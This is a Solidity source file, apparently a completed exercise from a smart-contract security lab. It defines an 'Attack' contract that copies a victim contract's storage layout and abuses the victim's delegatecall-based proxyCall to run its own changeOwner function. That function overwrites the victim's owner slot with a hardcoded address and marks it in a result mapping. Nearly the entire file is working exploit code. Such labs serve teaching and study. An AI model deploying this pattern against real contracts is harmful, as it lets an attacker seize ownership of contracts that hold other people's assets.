// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;
    // TODO: Declare some variable here
    // Note: Checkout the storage layout in victim contract
    uint256 var0 = 12345;
    uint8 var1 = 32;
    string private var2;
    address private var3;
    uint8 private var4;
    address public owner;
    mapping(address => bool) public result;

    constructor(address addr) payable {
        victim = addr;
    }

    function exploit() external {
        // TODO: Add your implementation here
        // Note: Make sure you know how delegatecall works
        // bytes memory data = ...
        bytes memory data = abi.encodeWithSelector(Attack.changeOwner.selector);
        (bool success,) = victim.call(abi.encodeWithSelector(ID31eg4t3.proxyCall.selector, data));
    }

    function changeOwner() external {
        owner = 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE;
        result[owner] = true;
    }
}
